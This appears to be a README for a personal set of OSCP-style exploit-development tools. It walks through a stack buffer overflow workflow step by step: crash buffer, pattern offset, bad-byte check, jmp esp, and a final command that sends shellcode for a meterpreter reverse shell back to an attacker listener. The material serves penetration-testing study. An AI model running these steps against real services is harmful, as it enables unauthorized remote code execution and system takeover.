# OffensiveTools
Some offensive tools that I am playing around with

----- ExploitShadow.py -----

I was trying to save some time on my OSCP exam and decided to build most of the exploit dev stages into one single python script where you can choose the mode based on where you are in the process. The only other thing you might need to configure that was not in the instructions is the way the "maliciousbuffer" variables get crafted within each mode, based on the application you're attacking; I'll leave that for you to decide, because it's ridiculously easy :)

The idea is you should have your msfconsole up and exploit/multi/handler set to use whatever payload you configured in ExploitShadow, then to get your shell you will use mode 4 like this:

./exploitshadow.py 4 2006 0x11223344 10.0.0.1 443 10.0.0.10 9999

In the above example, the argument "4" is the mode I am using to send the final payload to get a meterpreter session. I initially crashed the program with mode 1, then found that 2006 is the number of bytes offset to the EIP overwrite (found via modes 2 and 5), then checked for bad characters with mode 3 (00, 0a, 0d are there by default), then send the final payload with mode 4. The 0x11223344 is the theoretical memory location of a "jmp esp" command, which would hit the second nopsled directly after the EIP overwrite and continue onto the shellcode. The 10.0.0.1 and 443 are the LHOST/LPORT information fed into msfvenom. The 10.0.0.10 and 9999 are the IP address of the remote server and port we are attacking.

Honestly, the cherry on top in this is the fact that it gives you a date/time stamp of when the payload is sent at the very end, because we are pentesters and the report is what matters to the client, right???

The complete process looked more like this:

***** I sent a buffer of "TRUN ." + 3000 A's, resulting in a crash...
./exploitshadow.py 1 3000 10.0.0.10 9999
***** Since that crashed it, I had the tool generate a pattern of 3000 characters and sent that next...
./exploitshadow.py 2 3000 10.0.0.10 9999
***** At this point, the EIP register had the hex values 396F4338 inside it, so now I just need to find that offset next...
./exploitshadow.py 5 3000 396F4338
***** Now I know that the offset is 2006, because that's what mode 5 gives me as output, so now I sent a buffer with all byte values 0-255...
./exploitshadow.py 3 2006 10.0.0.10 9999
***** Keep doing that and using badbytecheck.py to eliminate bad bytes/chars. When you have them all eliminated, and you find a proper jump address, send payload...
./exploitshadow.py 4 2006 0x11223344 10.0.0.1 443 10.0.0.10 9999

----- BadByteCheck.py -----

Furthering the process of automating exploit development, I realize that you can probably do the same thing with tools such as Mona.py, but I enjoy writing my own tools and this is one that I find less annoying to deploy. Once I've sent a buffer with all byte values 0-255, I dump the memory where those values begin from the debugger, and then run this tool against the dump file. Any byte values that I already know are most likely bad are pre-configured within the tool, and it's easy to add more. It skips the "bad" bytes in order when it's checking, and looks for any byte mismatches between the internally generated "allbytes" (0-255) range and the values that were actually dumped from the debugger, reporting any mismatches that can be verified with hexdump. Enjoy!
